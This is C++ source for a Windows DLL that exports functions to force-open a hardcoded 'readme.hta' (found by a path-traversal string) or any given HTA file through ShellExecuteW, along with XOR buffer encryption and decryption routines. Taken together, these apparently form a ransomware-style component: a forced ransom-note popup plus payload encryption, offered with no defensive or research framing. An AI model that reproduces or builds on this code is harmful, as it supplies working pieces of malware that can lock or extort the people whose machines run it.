// nsfw.cpp : Defines the exported functions for the DLL.
//

#define NSFW_EXPORTS
#include "pch.h"
#include "framework.h"
#include "nsfw.h"
#include <windows.h>
#include <shellapi.h>

// This is an example of an exported variable
NSFW_API int nnsfw = 0;

// This is an example of an exported function.
NSFW_API int fnnsfw(void)
{
    return 0;
}

// Force pop-up of readme.hta from a hardcoded path
NSFW_API BOOL ForcePopupReadmeHta()
{
    const wchar_t* htaPath = L"..\\..\\..\\..\\..\\..\\source\\repos\\readme.hta";
    HINSTANCE result = ShellExecuteW(
        NULL,
        L"open",
        htaPath,
        NULL,
        NULL,
        SW_SHOWNORMAL
    );
    return ((INT_PTR)result > 32);
}

// Force pop-up of a specified .hta file
NSFW_API BOOL ForcePopupReadmeHtaEx(const wchar_t* htaPath)
{
    if (!htaPath) return FALSE;
    HINSTANCE result = ShellExecuteW(
        NULL,
        L"open",
        htaPath,
        NULL,
        NULL,
        SW_SHOWNORMAL
    );
    return ((INT_PTR)result > 32);
}

// XOR encryption/decryption function
NSFW_API void XorEncryptDecrypt(char* data, size_t dataLen, const char* key, size_t keyLen)
{
    if (!data || !key || keyLen == 0) return;
    for (size_t i = 0; i < dataLen; ++i) {
        data[i] ^= key[i % keyLen];
    }
}

// Exported function to XOR encrypt a buffer (for use from other modules)
NSFW_API void XorEncryptBuffer(char* buffer, size_t length, const char* key, size_t keyLen)
{
    XorEncryptDecrypt(buffer, length, key, keyLen);
}

// Exported function to XOR decrypt a buffer (for use from other modules)
NSFW_API void XorDecryptBuffer(char* buffer, size_t length, const char* key, size_t keyLen)
{
    XorEncryptDecrypt(buffer, length, key, keyLen);
}

#ifdef __cplusplus
Cnsfw::Cnsfw() {}
#endif
